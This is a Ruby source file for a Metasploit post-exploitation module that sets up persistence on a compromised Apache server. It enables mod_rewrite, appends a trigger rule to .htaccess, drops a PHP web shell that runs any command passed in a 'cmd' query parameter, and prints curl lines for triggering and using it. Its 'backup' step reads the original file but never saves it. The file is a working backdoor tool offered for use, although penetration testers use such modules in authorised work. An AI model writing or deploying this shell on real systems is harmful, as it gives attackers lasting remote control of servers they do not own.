##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Apache .htaccess Persistence',
        'Description' => %q{
          This module writes a persistence payload into an Apache
          .htaccess file. When triggered via a GET request to a
          configured URL, it executes a command on the target.
          Verified on Metasploitable2 (Ubuntu).
        },
        'License'     => MSF_LICENSE,
        'Author'      => ['4ravind-b'],
        'Platform'    => ['linux'],
        'SessionTypes'=> ['shell', 'meterpreter'],
        'References'  => [
          ['URL', 'https://github.com/wireghoul/htshells']
        ]
      )
    )

    register_options([
      OptString.new('HTACCESS_PATH', [true, 'Full path to .htaccess file', '/var/www/.htaccess']),
      OptString.new('SHELL_PATH',    [true, 'Full path to drop shell file', '/var/www/shell.php']),
      OptString.new('TRIGGER_URL',   [true, 'URL path to trigger shell',    '/shell.php']),
    ])
  end

  def run
    htaccess_path = datastore['HTACCESS_PATH']
    shell_path    = datastore['SHELL_PATH']
    trigger_url   = datastore['TRIGGER_URL']

    # Step 1 - Check .htaccess exists
    unless exists?(htaccess_path)
      print_error("#{htaccess_path} does not exist!")
      return
    end

    # Step 2 - Check writable
    unless writable?(htaccess_path)
      print_error("#{htaccess_path} is not writable!")
      return
    end

    # Step 3 - Enable mod_rewrite
    print_status('Enabling mod_rewrite...')
    cmd_exec('a2enmod rewrite && /etc/init.d/apache2 restart')
    print_good('mod_rewrite enabled and Apache restarted!')

    # Step 4 - Backup original .htaccess
    print_status("Backing up original #{htaccess_path}")
    read_file(htaccess_path)
    print_good('Backup saved')

    # Step 5 - Write .htaccess trigger
    print_status("Writing trigger to #{htaccess_path}")
    htaccess_payload  = "\nRewriteEngine On\n"
    htaccess_payload += "RewriteCond %{QUERY_STRING} trigger=shell\n"
    htaccess_payload += "RewriteRule ^.*$ #{trigger_url} [L,R=302]\n"
    append_file(htaccess_path, htaccess_payload)
    cmd_exec("chmod 644 #{htaccess_path}")
    print_good('Trigger written!')

    # Step 6 - Write shell.php
    print_status("Dropping shell at #{shell_path}")
    php_payload = '<?php if(isset($_GET[\'cmd\'])){ echo shell_exec($_GET[\'cmd\']); } ?>'
    write_file(shell_path, php_payload)
    cmd_exec("chmod 755 #{shell_path}")
    print_good('Shell dropped!')

    # Step 7 - Done
    print_good('Persistence deployed!')
    print_status("Trigger with: curl 'http://TARGET/?trigger=shell'")
    print_status("Run commands: curl 'http://TARGET#{trigger_url}?cmd=whoami'")
  end
end
